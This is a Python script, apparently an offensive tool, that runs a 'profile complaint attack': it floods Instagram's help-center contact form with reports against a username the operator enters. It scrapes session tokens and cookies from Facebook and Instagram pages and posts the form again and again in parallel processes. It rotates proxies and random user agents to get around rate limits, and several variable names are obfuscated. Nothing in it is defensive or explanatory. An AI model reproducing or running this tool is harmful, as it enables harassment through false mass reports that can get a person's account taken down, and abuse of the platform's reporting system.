#!/usr/bin/env python3
from requests import Session 
from multiprocessing import Process 
from sys import exit 
import string 
import random 

import pprint 
from utils import print_success 
from utils import print_error 
from utils import print_status 
from utils import parse_proxy_file 
from user_agents import get_user_agent 
page_headers ={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Encoding":"gzip, deflate","Accept-Language":"tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3","Cache-Control":"no-cache","Connection":"keep-alive","DNT":"1",}
report_headers ={"Accept":"*/*","Accept-Encoding":"gzip, deflate","Accept-Language":"tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3","Cache-Control":"no-cache","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","DNT":"1","Host":"help.instagram.com","Origin":"help.instagram.com","Pragma":"no-cache","Referer":"https://help.instagram.com/contact/497253480400030","TE":"Trailers",}


def random_str (strLength ):
    randomStr =string .ascii_lowercase +string .ascii_uppercase +string .digits 
    return ''.join (random .choice (randomStr )for character in range (strLength ))
    
    
    #main profile reporting start.........
def report_profile_attack (p_targetUsername ,p_proxyItems):
    
    _sessionStore =Session()
    if (p_proxyItems !=None ):
        _sessionStore.proxies ={"https":"https://"+p_proxyItems ,"http":"https://"+p_proxyItems }
    randomUserAgent =get_user_agent ()
    page_headers ["User-Agent"]=randomUserAgent 
    report_headers ["User-Agent"]=randomUserAgent 
    try :
        fbReq =_sessionStore.get("https://www.facebook.com/",timeout =10 )
        #print(fbReq.status_code)
       
    except :
        print_error ("Connection error! (FacebookRequestsError) ~")
        return 
    if (fbReq .status_code !=200 ):
        print_error ("Connection error! (STATUS CODE:",fbReq .status_code ,")")
        return 
    if ('["_js_datr","'not in fbReq .text ):
        print_error ("Connection error! (CookieErrorJSDatr)")
        return 
    try :
        fb_js_datr =fbReq .text .split ('["_js_datr","')[1 ].split ('",')[0 ]
        #print("_js_datr : ",fb_js_datr)
    except :
        print_error ("Connection error! (CookieParsingError) ~~")
        return 
    _cookieTopst ={"_js_datr":fb_js_datr }
    try :
        fbReq =_sessionStore.get ("https://help.instagram.com/contact/497253480400030",cookies =_cookieTopst ,headers =page_headers ,timeout =10 )
        #print(fbReq.status_code)
    except :
        print_error ("Connection error! (InstagramRequestsError) ~~~")
        #print(fbReq.status_code)
        return 
    if (fbReq .status_code !=200 ):
        print_error ("Connection error! (STATUS CODE:",fbReq .status_code ,")")
        return 
    if ("datr"not in fbReq .cookies .get_dict ()):
        print_error ("Connection error! (CookieErrorDatr) ~~~~")
        return 
    if ('["LSD",[],{"token":"'not in fbReq .text ):
        print_error ("Connection error! (CookieErrorLSD) ~~~~~")
        return 
    if ('"__spin_r":'not in fbReq .text ):
        print_error ("Connection error! (CookieErrorSpinR) ~~~~~~")
        return 
    if ('"__spin_b":'not in fbReq .text ):
        print_error ("Connection error! (CookieErrorSpinB) ~~~~~~~")
        return 
    if ('"__spin_t":'not in fbReq .text ):
        print_error ("Connection error! (CookieErrorSpinT) ~~~~~~~~")
        return 
    if ('"server_revision":'not in fbReq .text ):
        print_error ("Connection error! (CookieErrorRev) ~~~~~~~~~")
        return 
    if ('"hsi":'not in fbReq .text ):
        print_error ("Connection error! (CookieErrorHsi) ~~~~~~~~~~")
        return 
    try :
        OOOOOO000OOOO0O00 =fbReq.text .split ('["LSD",[],{"token":"')[1 ].split ('"},')[0 ]
        OO00O0O0O00OOOOO0 =fbReq.text .split ('"__spin_r":')[1 ].split (',')[0 ]
        OO00OO000OO000OO0 =fbReq.text .split ('"__spin_b":')[1 ].split (',')[0 ].replace ('"',"")
        O00O0O0O0O00O0O00 =fbReq.text .split ('"__spin_t":')[1 ].split (',')[0 ]
        OO0O0OO00OOOOOO0O =fbReq.text .split ('"hsi":')[1 ].split (',')[0 ].replace ('"',"")
        O000OO0OOO00000OO =fbReq.text .split ('"server_revision":')[1 ].split (',')[0 ].replace ('"',"")
        O0O0OOOOOO00O00OO =fbReq.cookies.get_dict ()["datr"]
    except :
        print_error ("Connection error! (CookieParsingError) ~-")
        return 
    _cookieTopst_v2 ={"datr":O0O0OOOOOO00O00OO }
    fbReq_post_Data ={"jazoest":"2723","lsd":OOOOOO000OOOO0O00 ,"instagram_username":p_targetUsername ,"Field241164302734019_iso2_country_code":"TR","Field241164302734019":"Türkiye","support_form_id":"497253480400030","support_form_hidden_fields":"{}","support_form_fact_false_fields":"[]","__user":"0","__a":"1","__dyn":"7xe6Fo4SQ1PyUhxOnFwn84a2i5U4e1Fx-ey8kxx0LxW0DUeUhw5cx60Vo1upE4W0OE2WxO0SobEa81Vrzo5-0jx0Fwww6DwtU6e","__csr":"","__req":"d","__beoa":"0","__pc":"PHASED:DEFAULT","dpr":"1","__rev":O000OO0OOO00000OO ,"__s":"5gbxno:2obi73:56i3vc","__hsi":OO0O0OO00OOOOOO0O ,"__comet_req":"0","__spin_r":OO00O0O0O00OOOOO0 ,"__spin_b":OO00OO000OO000OO0 ,"__spin_t":O00O0O0O0O00O0O00 }
    try :
        fbReq =_sessionStore .post ("https://help.instagram.com/ajax/help/contact/submit/page",data =fbReq_post_Data ,headers =report_headers ,cookies =_cookieTopst_v2 ,timeout =10 )
    except :
        print_error ("Connection error occurred (FormRequestsError) ----")
        return 
    if (fbReq .status_code !=200 ):
        print_error ("Connection error occurred (STATUS CODE:",fbReq .status_code ,")")
        return 
    print_success ("Successfully reported! ++++++++++++++++")

    
    
def chunks (O0O0O000O000OOOO0 ,O0OO0O0OO0OOOOO00 ):
    ""
    for O000000O0OOO00OOO in range (0 ,len (O0O0O000O000OOOO0 ),O0OO0O0OO0OOOOO00 ):
        yield O0O0O000O000OOOO0 [O000000O0OOO00OOO :O000000O0OOO00OOO +O0OO0O0OO0OOOOO00 ]  
    
    
def profile_attack_process (_tarUsername ,_proxyEachItem ):
    if (len (_proxyEachItem )==0 ):
        for _OOOOO0O00O0OOOOO0 in range (10 ):
            report_profile_attack (_tarUsername ,None )
        return 

    for _proxyEachItem_i in _proxyEachItem :
        report_profile_attack (_tarUsername ,_proxyEachItem_i )

    
if __name__=="__main__":
    targetUSername=input("Enter target username :")
    proxyfileUrl =input ("Enter url to your proxy list : ") 
    print("Loading proxies.....")
    parsedProxyFromFile =parse_proxy_file (proxyfileUrl)
    _proxyList =list (chunks (parsedProxyFromFile ,10 ))
    
    print ("Starting........")
    print_status ("Profile complaint attack is starting!\n")
    loop_i_ =1 
    for proxyEachItems in _proxyList :
        profileAttProcess =Process (target =profile_attack_process ,args =(targetUSername ,proxyEachItems ,))
        profileAttProcess.start ()
        
